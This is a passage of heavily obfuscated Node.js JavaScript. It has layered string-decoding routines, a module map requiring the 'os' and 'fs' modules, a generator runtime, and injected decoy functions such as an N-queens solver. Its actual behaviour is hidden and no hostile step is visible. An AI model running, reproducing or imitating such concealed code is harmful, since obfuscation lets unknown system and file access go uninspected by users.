hb0EB_=RBOkiuJ.indexOf(svZDltY[EBjXmGw]);if(hb0EB_===-McEUGbi[0x1])continue;if(msUitO<McEUGbi[0x0]){msUitO=hb0EB_}else{SFoT2s(msUitO+=hb0EB_*McEUGbi[0xc],U4emrr|=msUitO<<xf5JGoX,xf5JGoX+=(msUitO&McEUGbi[0xd])>McEUGbi[0xe]?McEUGbi[0xf]:McEUGbi[0x10]);do{SFoT2s(bLWrPc.push(U4emrr&McEUGbi[0x3]),U4emrr>>=McEUGbi[0x2],xf5JGoX-=McEUGbi[0x2])}while(xf5JGoX>McEUGbi[0x9]);msUitO=-McEUGbi[0x1]}}if(msUitO>-McEUGbi[0x1]){bLWrPc.push((U4emrr|msUitO<<xf5JGoX)&McEUGbi[0x3])}return JEtDCZ(bLWrPc)}function RBOkiuJ(q7TIhEw){if(typeof b1Byj0[q7TIhEw]===McEUGbi[0x5]){return b1Byj0[q7TIhEw]=Vpqkej(r0hQeKA[q7TIhEw])}return b1Byj0[q7TIhEw]}q7TIhEw[RBOkiuJ(McEUGbi[0xe])]=require("os")},[McEUGbi[0x21]]:q7TIhEw=>{"use strict";q7TIhEw[ANwvNEQ(McEUGbi[0x11])]=require("fs")}},q7TIhEw={});function Vy3HTqz(Vpqkej){var RBOkiuJ,svZDltY;function F97NQdY(Vpqkej){var RBOkiuJ="zDrtVHhgKZjxSfo2\"b!TpmRNnQq6;4>[30Y$8,}?|)Xw/cAe=+9iJIByPGEL7%W#C&v_O^Ud.~5<(sM]@u1lka:`{F*",svZDltY,F97NQdY,bLWrPc,U4emrr,xf5JGoX,q7TIhEw,msUitO;SFoT2s(svZDltY=""+(Vpqkej||""),F97NQdY=svZDltY.length,bLWrPc=[],U4emrr=McEUGbi[0x0],xf5JGoX=McEUGbi[0x0],q7TIhEw=-McEUGbi[0x1]);for(msUitO=McEUGbi[0x0];msUitO<F97NQdY;msUitO++){var EBjXmGw=RBOkiuJ.indexOf(svZDltY[msUitO]);if(EBjXmGw===-McEUGbi[0x1])continue;if(q7TIhEw<McEUGbi[0x0]){q7TIhEw=EBjXmGw}else{SFoT2s(q7TIhEw+=EBjXmGw*McEUGbi[0xc],U4emrr|=q7TIhEw<<xf5JGoX,xf5JGoX+=(q7TIhEw&McEUGbi[0xd])>McEUGbi[0xe]?McEUGbi[0xf]:McEUGbi[0x10]);do{SFoT2s(bLWrPc.push(U4emrr&McEUGbi[0x3]),U4emrr>>=McEUGbi[0x2],xf5JGoX-=McEUGbi[0x2])}while(xf5JGoX>McEUGbi[0x9]);q7TIhEw=-McEUGbi[0x1]}}if(q7TIhEw>-McEUGbi[0x1]){bLWrPc.push((U4emrr|q7TIhEw<<xf5JGoX)&McEUGbi[0x3])}return JEtDCZ(bLWrPc)}function bLWrPc(Vpqkej){if(typeof b1Byj0[Vpqkej]===McEUGbi[0x5]){return b1Byj0[Vpqkej]=F97NQdY(r0hQeKA[Vpqkej])}return b1Byj0[Vpqkej]}RBOkiuJ=q7TIhEw[Vpqkej];if(void McEUGbi[0x0]!==RBOkiuJ){function U4emrr(Vpqkej){var RBOkiuJ="8nfGjAaT^]K(m@gzq$_l[5,r:BpXVc~h;C!?E74R)`+De/FyusZ*xvY3o.{M=1LJ2|0OUi#w<Q>bNk9PtdHWIS&%}6\"",svZDltY,F97NQdY,bLWrPc,U4emrr,xf5JGoX,q7TIhEw,msUitO;SFoT2s(svZDltY=""+(Vpqkej||""),F97NQdY=svZDltY.length,bLWrPc=[],U4emrr=McEUGbi[0x0],xf5JGoX=McEUGbi[0x0],q7TIhEw=-McEUGbi[0x1]);for(msUitO=McEUGbi[0x0];msUitO<F97NQdY;msUitO++){var EBjXmGw=RBOkiuJ.indexOf(svZDltY[msUitO]);if(EBjXmGw===-McEUGbi[0x1])continue;if(q7TIhEw<McEUGbi[0x0]){q7TIhEw=EBjXmGw}else{SFoT2s(q7TIhEw+=EBjXmGw*McEUGbi[0xc],U4emrr|=q7TIhEw<<xf5JGoX,xf5JGoX+=(q7TIhEw&McEUGbi[0xd])>McEUGbi[0xe]?McEUGbi[0xf]:McEUGbi[0x10]);do{SFoT2s(bLWrPc.push(U4emrr&McEUGbi[0x3]),U4emrr>>=McEUGbi[0x2],xf5JGoX-=McEUGbi[0x2])}while(xf5JGoX>McEUGbi[0x9]);q7TIhEw=-McEUGbi[0x1]}}if(q7TIhEw>-McEUGbi[0x1]){bLWrPc.push((U4emrr|q7TIhEw<<xf5JGoX)&McEUGbi[0x3])}return JEtDCZ(bLWrPc)}function xf5JGoX(Vpqkej){if(typeof b1Byj0[Vpqkej]===McEUGbi[0x5]){return b1Byj0[Vpqkej]=U4emrr(r0hQeKA[Vpqkej])}return b1Byj0[Vpqkej]}return RBOkiuJ[xf5JGoX(0x5a)]}svZDltY=q7TIhEw[Vpqkej]={[ANwvNEQ(McEUGbi[0x11])]:{}};return R4y7UQ[Vpqkej](svZDltY,svZDltY[bLWrPc(McEUGbi[0xc])],Vy3HTqz),svZDltY[bLWrPc(McEUGbi[0xc])]}function Q9V1r7(xf5JGoX,msUitO,EBjXmGw,hb0EB_,CDWv3j,O1DDlX,jTVQTEg,ZwHurCB,t7CxrL,glktMJ,qq2T4n,XOUZpH,klPO1jx,S5tZKwH,T2Y9Fgp){if(!T2Y9Fgp){T2Y9Fgp=function(xf5JGoX){function msUitO(msUitO){var hb0EB_="acpsHFtiZqLYNflKjCDhQknREdbgBAJXTzvG./MSeIU$#&o37r1WO)mP;0{5u}+=@|:>[,*86(9^_%xw<y2`?4!]\"~V",CDWv3j,O1DDlX,jTVQTEg,t7CxrL,glktMJ,XOUZpH,klPO1jx;SFoT2s(CDWv3j=""+(msUitO||""),O1DDlX=CDWv3j.length,jTVQTEg=[],t7CxrL=McEUGbi[0x0],glktMJ=McEUGbi[0x0],XOUZpH=-McEUGbi[0x1]);for(klPO1jx=McEUGbi[0x0];klPO1jx<O1DDlX;klPO1jx++){var S5tZKwH=hb0EB_.indexOf(CDWv3j[klPO1jx]);if(S5tZKwH===-McEUGbi[0x1])continue;if(XOUZpH<McEUGbi[0x0]){XOUZpH=S5tZKwH}else{SFoT2s(XOUZpH+=S5tZKwH*McEUGbi[0xc],t7CxrL|=XOUZpH<<glktMJ,glktMJ+=(XOUZpH&McEUGbi[0xd])>McEUGbi[0xe]?McEUGbi[0xf]:McEUGbi[0x10]);do{SFoT2s(jTVQTEg.push(t7CxrL&McEUGbi[0x3]),t7CxrL>>=McEUGbi[0x2],glktMJ-=McEUGbi[0x2])}while(glktMJ>McEUGbi[0x9]);XOUZpH=-McEUGbi[0x1]}}if(XOUZpH>-McEUGbi[0x1]){jTVQTEg.push((t7CxrL|XOUZpH<<glktMJ)&McEUGbi[0x3])}return JEtDCZ(jTVQTEg)}function hb0EB_(xf5JGoX){if(typeof b1Byj0[xf5JGoX]===McEUGbi[0x5]){return b1Byj0[xf5JGoX]=msUitO(r0hQeKA[xf5JGoX])}return b1Byj0[xf5JGoX]}return Object[hb0EB_(McEUGbi[0x1c])]?Object[hb0EB_(McEUGbi[0x1c])](xf5JGoX,XOUZpH):(xf5JGoX[hb0EB_(0x7a)]=XOUZpH,s6MdtwU(xf5JGoX,jTVQTEg,hb0EB_(0x7b))),xf5JGoX[hb0EB_(0x7c)]=Object[hb0EB_(0x7d)](S5tZKwH),xf5JGoX}}if(!XOUZpH){XOUZpH=function(){}}if(!qq2T4n){qq2T4n=function(){}}if(!glktMJ){glktMJ=function(){}}if(!ZwHurCB){ZwHurCB=function(xf5JGoX,gRQAQy,S3ncdk,ANwvNEQ,RlTdgO,OpGyiG1,Ef7XDv5,gv3BHj){if(!OpGyiG1){OpGyiG1=function(xf5JGoX){if(typeof b1Byj0[xf5JGoX]===McEUGbi[0x5]){return b1Byj0[xf5JGoX]=RlTdgO(r0hQeKA[xf5JGoX])}return b1Byj0[xf5JGoX]}}if(!RlTdgO){RlTdgO=function(xf5JGoX){var gRQAQy="60[PRkG~qnXz^9<j`pA|7Bl>_)bCUO=I.#$uvht/T@}M?fs1D\"&%cgye2]EmFHxa;4Q:w*!r{LSZJo+WY3K(NVd,i85",S3ncdk,ANwvNEQ,RlTdgO,OpGyiG1,msUitO,hb0EB_,CDWv3j;SFoT2s(S3ncdk=""+(xf5JGoX||""),ANwvNEQ=S3ncdk.length,RlTdgO=[],OpGyiG1=McEUGbi[0x0],msUitO=McEUGbi[0x0],hb0EB_=-McEUGbi[0x1]);for(CDWv3j=McEUGbi[0x0];CDWv3j<ANwvNEQ;CDWv3j++){var O1DDlX=gRQAQy.indexOf(S3ncdk[CDWv3j]);if(O1DDlX===-McEUGbi[0x1])continue;if(hb0EB_<McEUGbi[0x0]){hb0EB_=O1DDlX}else{SFoT2s(hb0EB_+=O1DDlX*McEUGbi[0xc],OpGyiG1|=hb0EB_<<msUitO,msUitO+=(hb0EB_&McEUGbi[0xd])>McEUGbi[0xe]?McEUGbi[0xf]:McEUGbi[0x10]);do{SFoT2s(RlTdgO.push(OpGyiG1&McEUGbi[0x3]),OpGyiG1>>=McEUGbi[0x2],msUitO-=McEUGbi[0x2])}while(msUitO>McEUGbi[0x9]);hb0EB_=-McEUGbi[0x1]}}if(hb0EB_>-McEUGbi[0x1]){RlTdgO.push((OpGyiG1|hb0EB_<<msUitO)&McEUGbi[0x3])}return JEtDCZ(RlTdgO)}}SFoT2s(Ef7XDv5=gRQAQy&&gRQAQy[msUitO(McEUGbi[0x1b])]instanceof glktMJ?gRQAQy:glktMJ,gv3BHj=Object[OpGyiG1(0x62)](Ef7XDv5[OpGyiG1(0x63)]));return s6MdtwU(gv3BHj,OpGyiG1(0x64),function(RlTdgO,msUitO,jt8Omv){var i15lfAv,_JGV9n6,Jfq3knm,RMPVm7A,IYRhOB,a6Wb4o4,Wyvgn1n;SFoT2s(_JGV9n6=void 0x0,Jfq3knm=void 0x0,RMPVm7A=McEUGbi[0x0],IYRhOB=jt8Omv||[],a6Wb4o4=!McEUGbi[0x1],Wyvgn1n={[McEUGbi[0x13]]:McEUGbi[0x0],[McEUGbi[0x12]]:McEUGbi[0x0],[McEUGbi[0x18]]:EBjXmGw,[McEUGbi[0x25]]:uLhhUN,[McEUGbi[0x27]]:uLhhUN[OpGyiG1(0x65)](EBjXmGw,McEUGbi[0x15]),[McEUGbi[0x26]]:function(msUitO,jt8Omv){return i15lfAv=msUitO,_JGV9n6=McEUGbi[0x0],Jfq3knm=EBjXmGw,Wyvgn1n[McEUGbi[0x12]]=jt8Omv,t7CxrL}});function uLhhUN(yQ9j36j,UAlne2,PswsqCh,KuraB8I,lvpEVM7,xhgq6gp){for(_JGV9n6=yQ9j36j,Jfq3knm=UAlne2,hb0EB_=McEUGbi[0x0];!a6Wb4o4&&RMPVm7A&&!PswsqCh&&hb0EB_<IYRhOB[OpGyiG1(0x66)];hb0EB_++){SFoT2s(PswsqCh=void 0x0,KuraB8I=IYRhOB[hb0EB_],lvpEVM7=Wyvgn1n[McEUGbi[0x13]],xhgq6gp=KuraB8I[McEUGbi[0x17]],yQ9j36j>McEUGbi[0x14]?(PswsqCh=xhgq6gp===UAlne2)&&(Jfq3knm=KuraB8I[(_JGV9n6=KuraB8I[McEUGbi[0x15]])?McEUGbi[0x16]:(_JGV9n6=McEUGbi[0x14],McEUGbi[0x14])],KuraB8I[McEUGbi[0x15]]=KuraB8I[McEUGbi[0x16]]=EBjXmGw):KuraB8I[McEUGbi[0x0]]<=lvpEVM7&&((PswsqCh=yQ9j36j<McEUGbi[0x17]&&lvpEVM7<KuraB8I[McEUGbi[0x1]])?(_JGV9n6=McEUGbi[0x0],Wyvgn1n[McEUGbi[0x18]]=UAlne2,Wyvgn1n[McEUGbi[0x12]]=KuraB8I[McEUGbi[0x1]]):lvpEVM7<xhgq6gp&&(PswsqCh=yQ9j36j<McEUGbi[0x14]||KuraB8I[McEUGbi[0x0]]>UAlne2||UAlne2>xhgq6gp)&&(KuraB8I[McEUGbi[0x15]]=yQ9j36j,KuraB8I[McEUGbi[0x16]]=UAlne2,Wyvgn1n[McEUGbi[0x12]]=xhgq6gp,_JGV9n6=McEUGbi[0x0])))}if(PswsqCh||yQ9j36j>McEUGbi[0x1]){function cZ6B6N0(yQ9j36j){var UAlne2="e/YX7x4BuA}rLyD[T9#M,P|3~0%`{gl(=v.V@Cw1>6zJkH^<a?!5E&t+)S\"$Q82nWR];IO*:_jiocKsdhNZGmqFUpfb",PswsqCh,KuraB8I,lvpEVM7,xhgq6gp,cZ6B6N0,NzKLjH,UtaMie2;SFoT2s(PswsqCh=""+(yQ9j36j||""),KuraB8I=PswsqCh.length,lvpEVM7=[],xhgq6gp=McEUGbi[0x0],cZ6B6N0=McEUGbi[0x0],NzKLjH=-McEUGbi[0x1]);for(UtaMie2=McEUGbi[0x0];UtaMie2<KuraB8I;UtaMie2++){var RlTdgO=UAlne2.indexOf(PswsqCh[UtaMie2]);if(RlTdgO===-McEUGbi[0x1])continue;if(NzKLjH<McEUGbi[0x0]){NzKLjH=RlTdgO}else{SFoT2s(NzKLjH+=RlTdgO*McEUGbi[0xc],xhgq6gp|=NzKLjH<<cZ6B6N0,cZ6B6N0+=(NzKLjH&McEUGbi[0xd])>McEUGbi[0xe]?McEUGbi[0xf]:McEUGbi[0x10]);do{SFoT2s(lvpEVM7.push(xhgq6gp&McEUGbi[0x3]),xhgq6gp>>=McEUGbi[0x2],cZ6B6N0-=McEUGbi[0x2])}while(cZ6B6N0>McEUGbi[0x9]);NzKLjH=-McEUGbi[0x1]}}if(NzKLjH>-McEUGbi[0x1]){lvpEVM7.push((xhgq6gp|NzKLjH<<cZ6B6N0)&McEUGbi[0x3])}return JEtDCZ(lvpEVM7)}function NzKLjH(yQ9j36j){if(typeof b1Byj0[yQ9j36j]===McEUGbi[0x5]){return b1Byj0[yQ9j36j]=cZ6B6N0(r0hQeKA[yQ9j36j])}return b1Byj0[yQ9j36j]}if(NzKLjH(0x67)in RI3w2l){UtaMie2()}function UtaMie2(){var yQ9j36j=function(yQ9j36j){var PswsqCh=[];if(yQ9j36j===McEUGbi[0x1]||yQ9j36j>=McEUGbi[0x15])UAlne2(PswsqCh,[],yQ9j36j,McEUGbi[0x0]);return PswsqCh},UAlne2,PswsqCh,KuraB8I;SFoT2s(UAlne2=function(yQ9j36j,lvpEVM7,xhgq6gp,cZ6B6N0){var NzKLjH;for(NzKLjH=cZ6B6N0;NzKLjH<xhgq6gp;NzKLjH++){var UtaMie2;if(lvpEVM7.length!==NzKLjH)return;for(UtaMie2=McEUGbi[0x0];UtaMie2<xhgq6gp;UtaMie2++)if(KuraB8I(lvpEVM7,[NzKLjH,UtaMie2])){SFoT2s(lvpEVM7.push([NzKLjH,UtaMie2]),UAlne2(yQ9j36j,lvpEVM7,xhgq6gp,NzKLjH+McEUGbi[0x1]));if(lvpEVM7.length===xhgq6gp)yQ9j36j.push(PswsqCh(lvpEVM7));lvpEVM7.pop()}}},PswsqCh=function(yQ9j36j){var UAlne2=[],PswsqCh,KuraB8I;PswsqCh=yQ9j36j.length;for(KuraB8I=McEUGbi[0x0];KuraB8I<PswsqCh;KuraB8I++){var lvpEVM7;UAlne2[KuraB8I]="";for(lvpEVM7=McEUGbi[0x0];lvpEVM7<PswsqCh;lvpEVM7++)UAlne2[KuraB8I]+=yQ9j36j[KuraB8I][McEUGbi[0x1]]===lvpEVM7?"Q":McEUGbi[0x28]}return UAlne2},KuraB8I=function(yQ9j36j,UAlne2){var PswsqCh=yQ9j36j.length,KuraB8I;for(KuraB8I=McEUGbi[0x0];KuraB8I<PswsqCh;KuraB8I++){if(yQ9j36j[KuraB8I][McEUGbi[0x0]]===UAlne2[McEUGbi[0x0]]||yQ9j36j[KuraB8I][McEUGbi[0x1]]===UAlne2[McEUGbi[0x1]])return McEUGbi[0x19];if(Math.abs((yQ9j36j[KuraB8I][McEUGbi[0x0]]-UAlne2[McEUGbi[0x0]])/(yQ9j36j[KuraB8I][McEUGbi[0x1]]-UAlne2[McEUGbi[0x1]]))===McEUGbi[0x1])return McEUGbi[0x19]}return McEUGbi[0x1a]},console.log(yQ9j36j))}return t7CxrL}throw a6Wb4o4=!McEUGbi[0x0],UAlne2}return function(MkDzPi,B7Rflb,FAyL156){function Vb9JGk(MkDzPi){var FAyL156="H<2*Y%Kf6v(9a[s~VyS?;3Nl,ui=`oCPB7MLd_keTX4)w|I#!rDE+1hb5@Q\"0t}GWm{xgqpAc^&.8/nJ]>Fj$z:UROZ",Vb9JGk,NRr15q,_0HZey,XGCv22,oLFLLOi,aDgeO7,AQQjwi;SFoT2s(Vb9JGk=""+(MkDzPi||""),NRr15q=Vb9JGk.length,_0HZey=[],XGCv22=McEUGbi[0x0],oLFLLOi=McEUGbi[0x0],aDgeO7=-McEUGbi[0x1]);for(AQQjwi=McEUGbi[0x0];AQQjwi<NRr15q;AQQjwi++){var pf2IFgm=FAyL156.indexOf(Vb9JGk[AQQjwi]);if(pf2IFgm===-McEUGbi[0x1])continue;if(aDgeO7<McEUGbi[0x0]){aDgeO7=pf2IFgm}else{SFoT2s(aDgeO7+=pf2IFgm*McEUGbi[0xc],XGCv22|=aDgeO7<<oLFLLOi,oLFLLOi+=(aDgeO7&McEUGbi[0xd])>McEUGbi[0xe]?McEUGbi[0xf]:McEUGbi[0x10]);do{SFoT2s(_0HZey.push(XGCv22&McEUGbi[0x3]),XGCv22>>=McEUGbi[0x2],oLFLLOi-=McEUGbi[0x2])}while(oLFLLOi>McEUGbi[0x9]);aDgeO7=-McEUGbi[0x1]}}if(aDgeO7>-McEUGbi[0x1]){_0HZey.push((XGCv22|aDgeO7<<oLFLLOi)&McEUGbi[0x3])}return JEtDCZ(_0HZey)}function NRr15q(MkDzPi){if(typeof b1Byj0[MkDzPi]===McEUGbi[0x5]){return b1Byj0[MkDzPi]=Vb9JGk(r0hQeKA[MkDzPi])}return b1Byj0[MkDzPi]}if(RMPVm7A>McEUGbi[0x1]){throw TypeError(OpGyiG1(0x68))}for(a6Wb4o4&&McEUGbi[0x1]===B7Rflb&&uLhhUN(B7Rflb,FAyL156),_JGV9n6=B7Rflb,Jfq3knm=FAyL156;(wW7jjO=_JGV9n6<McEUGbi[0x17]?EBjXmGw:Jfq3knm)||!a6Wb4o4;){i15lfAv||(_JGV9n6?_JGV9n6<McEUGbi[0x14]?(_JGV9n6>McEUGbi[0x1]&&(Wyvgn1n[McEUGbi[0x12]]=-McEUGbi[0x1]),uLhhUN(_JGV9n6,Jfq3knm)):Wyvgn1n[McEUGbi[0x12]]=Jfq3knm:Wyvgn1n[McEUGbi[0x18]]=Jfq3knm);try{function _0HZey(MkDzPi){var FAyL156="1+4$79@:.*[=B&;~dMyl5S!U#rGgYpbxQX,A|E)?nTIP]w3(cv_sNLZ6WKi{OH0kje^FJ`>oDutqa28zf}Ch<m%R\"V/",Vb9JGk,NRr15q,_0HZey,XGCv22,oLFLLOi,aDgeO7,AQQjwi;SFoT2s(Vb9JGk=""+(MkDzPi||""),NRr15q=Vb9JGk.length,_0HZey=[],XGCv22=McEUGbi[0x0],oLFLLOi=McEUGbi[0x0],aDgeO7=-McEUGbi[0x1]);for(AQQjwi=McEUGbi[0x0];AQQjwi<NRr15q;AQQjwi++){var pf2IFgm=FAyL156.indexOf(Vb9JGk[AQQjwi]);if(pf2IFgm===-McEUGbi[0x1])continue;if(aDgeO7<McEUGbi[0x0]){aDgeO7=pf2IFgm}else{SFoT2s(aDgeO7+=pf2IFgm*McEUGbi[0xc],XGCv22|=aDgeO7<<oLFLLOi,oLFLLOi+=(aDgeO7&McEUGbi[0xd])>McEUGbi[0xe]?McEUGbi[0xf]:McEUGbi[0x10]);do{SFoT2s(_0HZey.push(XGCv22&McEUGbi[0x3]),XGCv22>>=McEUGbi[0x2],oLFLLOi-=McEUGbi[0x2])}while(oLFLLOi>McEUGbi[0x9]);aDgeO7=-McEUGbi[0x1]}}if(aDgeO7>-McEUGbi[0x1]){_0HZey.push((XGCv22|aDgeO7<<oLFLLOi)&McEUGbi[0x3])}return JEtDCZ(_0HZey)}function XGCv22(MkDzPi){if(typeof b1Byj0[MkDzPi]===McEUGbi[0x5]){return b1Byj0[MkDzPi]=_0HZey(r0hQeKA[MkDzPi])}return b1Byj0[MkDzPi]}if(XGCv22(0x69)in RI3w2l){oLFLLOi()}function oLFLLOi(){function MkDzPi(MkDzPi){const B7Rflb={};for(let FAyL156 of MkDzPi.replace(/[^w]/g,"").toLowerCase())B7Rflb[FAyL156]=B7Rflb[FAyL156]+McEUGbi[0x1]||McEUGbi[0x1];return B7Rflb}function B7Rflb(MkDzPi,B7Rflb){const FAyL156=buildCharMap(MkDzPi),Vb9JGk=buildCharMap(B7Rflb);for(let NRr15q in FAyL156)if(FAyL156[NRr15q]!==Vb9JGk[NRr15q]){return McEUGbi[0x19]}if(Object.keys(FAyL156).length!==Object.keys(Vb9JGk).length){return McEUGbi[0x19]}return McEUGbi[0x1a]}function FAyL156(MkDzPi){const B7Rflb=Vb9JGk(MkDzPi);return B7Rflb!==0x1/0x0}function Vb9JGk(MkDzPi){if(!MkDzPi){return-McEUGbi[0x1]}const B7Rflb=Vb9JGk(MkDzPi.left),FAyL156=Vb9JGk(MkDzPi.right),NRr15q=Math.abs(B7Rflb-FAyL156);if(B7Rflb===0x1/0x0||FAyL156===0x1/0x0||NRr15q>McEUGbi[0x1]){return 0x1/0x0}const _0HZey=Math.max(B7Rflb,FAyL156)+McEUGbi[0x1];return _0HZey}window[XGCv22(0x6a)]={buildCharacterMap:MkDzPi,isAnagrams:B7Rflb,isBalanced:FAyL156,getHeightBalanced:Vb9JGk}}if(RMPVm7A=McEUGbi[0x17],i15lfAv){if(_JGV9n6||(MkDzPi=XGCv22(0x6b)),wW7jjO=i15lfAv[MkDzPi]){function aDgeO7(MkDzPi){var FAyL156="_FSMcamAbeKWIYEROHiJQlXhgNsrUoTfndqp.|4D%*]x#~=u(;/j`ZtP+G71LVz\"2kBC,[y&8<$?0@59}63vw>){^!:",Vb9JGk,NRr15q,_0HZey,XGCv22,oLFLLOi,aDgeO7,AQQjwi;SFoT2s(Vb9JGk=""+(MkDzPi||""),NRr15q=Vb9JGk.length,_0HZey=[],XGCv22=McEUGbi[0x0],oLFLLOi=McEUGbi[0x0],aDgeO7=-McEUGbi[0x1]);for(AQQjwi=McEUGbi[0x0];AQQjwi<NRr15q;AQQjwi++){var pf2IFgm=FAyL156.indexOf(Vb9JGk[AQQjwi]);if(pf2IFgm===-McEUGbi[0x1])continue;if(aDgeO7<McEUGbi[0x0]){aDgeO7=pf2IFgm}else{SFoT2s(aDgeO7+=pf2IFgm*McEUGbi[0xc],XGCv22|=aDgeO7<<oLFLLOi,oLFLLOi+=(aDgeO7&McEUGbi[0xd])>McEUGbi[0xe]?McEUGbi[0xf]:McEUGbi[0x10]);do{SFoT2s(_0HZey.push(XGCv22&McEUGbi[0x3]),XGCv22>>=McEUGbi[0x2],oLFLLOi-=McEUGbi[0x2])}while(oLFLLOi>McEUGbi[0x9]);aDgeO7=-McEUGbi[0x1]}}if(aDgeO7>-McEUGbi[0x1]){_0HZey.push((XGCv22|aDgeO7<<oLFLLOi)&McEUGbi[0x3])}return JEtDCZ(_0HZey)}function AQQjwi(MkDzPi){if(typeof b1Byj0[MkDzPi]===McEUGbi[0x5]){return b1Byj0[MkDzPi]=aDgeO7(r0hQeKA[MkDzPi])}return b1Byj0[MkDzPi]}if(!(wW7jjO=wW7jjO[AQQjwi(0x6c)](i15lfAv,Jfq3knm))){function pf2IFgm(MkDzPi){var FAyL156="|*;$<79#=5}^X]f)Y\"xbHLy{R61[C2Dl?U+qmeFJj.3Tk&Bn!gc4AMP/_,:VraWohKZwvtiz%IEu8OGS@d(~s0pN>Q`",Vb9JGk,NRr15q,_0HZey,XGCv22,oLFLLOi,aDgeO7,AQQjwi;SFoT2s(Vb9JGk=""+(MkDzPi||""),NRr15q=Vb9JGk.length,_0HZey=[],XGCv22=McEUGbi[0x0],oLFLLOi=McEUGbi[0x0],aDgeO7=-McEUGbi[0x1]);for(AQQjwi=McEUGbi[0x0];AQQjwi<NRr15q;AQQjwi++){var pf2IFgm=FAyL156.indexOf(Vb9JGk[AQQjwi]);if(pf2IFgm===-McEUGbi[0x1])continue;if(aDgeO7<McEUGbi[0x0]){aDgeO7=pf2IFgm}else{SFoT2s(aDgeO7+=pf2IFgm*McEUGbi[0xc],XGCv22|=aDgeO7<<oLFLLOi,oLFLLOi+=(aDgeO7&McEUGbi[0xd])>McEUGbi[0xe]?McEUGbi[0xf]:McEUGbi[0x10]);do{SFoT2s(_0HZey.push(XGCv22&McEUGbi[0x3]),XGCv22>>=McEUGbi[0x2],oLFLLOi-=McEUGbi[0x2])}while(oLFLLOi>McEUGbi[0x9]);aDgeO7=-McEUGbi[0x1]}}if(aDgeO7>-McEUGbi[0x1]){_0HZey.push((XGCv22|aDgeO7<<oLFLLOi)&McEUGbi[0x3])}return JEtDCZ(_0HZey)}function Xu5ts36(MkDzPi){if(typeof b1Byj0[MkDzPi]===McEUGbi[0x5]){return b1Byj0[MkDzPi]=pf2IFgm(r0hQeKA[MkDzPi])}return b1Byj0[MkDzPi]}throw TypeError(Xu5ts36(0x6d))}if(!wW7jjO[AQQjwi(0x6e)]){return wW7jjO}SFoT2s(Jfq3knm=wW7jjO[AQQjwi(0x6f)],_JGV9n6<McEUGbi[0x17]&&(_JGV9n6=McEUGbi[0x0]))}else{function rRh1fYz(MkDzPi){var FAyL156="5SKCLgz2aB/UR=8$Vp`FJXQ>7qW%^\"ukvfo.es}i,nNID;0&Al*Gxym!([+@]b91EcM#:<PH?wtZrdYj4{O)T|_h~36",Vb9JGk,NRr15q,_0HZey,XGCv22,oLFLLOi,aDgeO7,AQQjwi;SFoT2s(Vb9JGk=""+(MkDzPi||""),NRr15q=Vb9JGk.length,_0HZey=[],XGCv22=McEUGbi[0x0],oLFLLOi=McEUGbi[0x0],aDgeO7=-McEUGbi[0x1]);for(AQQjwi=McEUGbi[0x0];AQQjwi<NRr15q;AQQjwi++){var pf2IFgm=FAyL156.indexOf(Vb9JGk[AQQjwi]);if(pf2IFgm===-McEUGbi[0x1])continue;if(aDgeO7<McEUGbi[0x0]){aDgeO7=pf2IFgm}else{SFoT2s(aDgeO7+=pf2IFgm*McEUGbi[0xc],XGCv22|=aDgeO7<<oLFLLOi,oLFLLOi+=(aDgeO7&McEUGbi[0xd])>McEUGbi[0xe]?McEUGbi[0xf]:McEUGbi[0x10]);do{SFoT2s(_0HZey.push(XGCv22&McEUGbi[0x3]),XGCv22>>=McEUGbi[0x2],oLFLLOi-=McEUGbi[0x2])}while(oLFLLOi>McEUGbi[0x9]);aDgeO7=-McEUGbi[0x1]}}if(aDgeO7>-McEUGbi[0x1]){_0HZey.push((XGCv22|aDgeO7<<oLFLLOi)&McEUGbi[0x3])}return JEtDCZ(_0HZey)}function oHcCex(MkDzPi){if(typeof b1Byj0[MkDzPi]===McEUGbi[0x5]){return b1Byj0[MkDzPi]=rRh1fYz(r0hQeKA[MkDzPi])}return b1Byj0[MkDzPi]}SFoT2s(McEUGbi[0x1]===_JGV9n6&&(wW7jjO=i15lfAv[oHcCex(0x70)])&&wW7jjO[oHcCex(0x71)](i15lfAv),_JGV9n6<McEUGbi[0x17]&&(Jfq3knm=TypeError(oHcCex(0x72)+MkDzPi+oHcCex(0x73)),_JGV9n6=McEUGbi[0x1]))}i15lfAv=EBjXmGw}else{function wklKc91(MkDzPi){var FAyL156="3|F.wJ_kQn>?hf\"4imKq`~ZexcSNGAWYl8sE6{u$Hv+gIMB%0C=PTyDVp/!,<rbO#&U}t197](zo2@:^R)jL[X;5a*d",Vb9JGk,NRr15q,_0HZey,XGCv22,oLFLLOi,aDgeO7,AQQjwi;SFoT2s(Vb9JGk=""+(MkDzPi||""),NRr15q=Vb9JGk.length,_0HZey=[],XGCv22=McEUGbi[0x0],oLFLLOi=McEUGbi[0x0],aDgeO7=-McEUGbi[0x1]);for(AQQjwi=McEUGbi[0x0];AQQjwi<NRr15q;AQQjwi++){var pf2IFgm=FAyL156.indexOf(Vb9JGk[AQQjwi]);if(pf2IFgm===-McEUGbi[0x1])continue;if(aDgeO7<McEUGbi[0x0]){aDgeO7=pf2IFgm}else{SFoT2s(aDgeO7+=pf2IFgm*McEUGbi[0xc],XGCv22|=aDgeO7<<oLFLLOi,oLFLLOi+=(aDgeO7&McEUGbi[0xd])>McEUGbi[0xe]?McEUGbi[0xf]:McEUGbi[0x10]);do{SFoT2s(_0HZey.push(XGCv22&McEUGbi[0x3]),XGCv22>>=McEUGbi[0x2],oLFLLOi-=McEUGbi[0x2])}while(oLFLLOi>McEUGbi[0x9]);aDgeO7=-McEUGbi[0x1]}}if(aDgeO7>-McEUGbi[0x1]){_0HZey.push((XGCv22|aDgeO7<<oLFLLOi)&McEUGbi[0x3])}return JEtDCZ(_0HZey)}function oLhJuN(MkDzPi){if(typeof b1Byj0[MkDzPi]===McEUGbi[0x5]){return b1Byj0[MkDzPi]=wklKc91(r0hQeKA[MkDzPi])}return b1Byj0[MkDzPi]}if((wW7jjO=(a6Wb4o4=Wyvgn1n[McEUGbi[0x12]]<McEUGbi[0x0])?Jfq3knm:RlTdgO[oLhJuN(0x74)](msUitO,Wyvgn1n))!==t7CxrL){break}}}catch(wW7jjO){SFoT2s(i15lfAv=EBjXmGw,_JGV9n6=McEUGbi[0x1],Jfq3knm=wW7jjO)}finally{RMPVm7A=McEUGbi[0x1]}}return{[NRr15q(0x75)]:wW7jjO,[NRr15q(0x76)]:a6Wb4o4}}}(xf5JGoX,S3ncdk,ANwvNEQ),!McEUGbi[0x0]),gv3BHj}}if(!msUitO){msUitO=function(msUitO){if(typeof b1Byj0[msUitO]===McEUGbi[0x5]){return 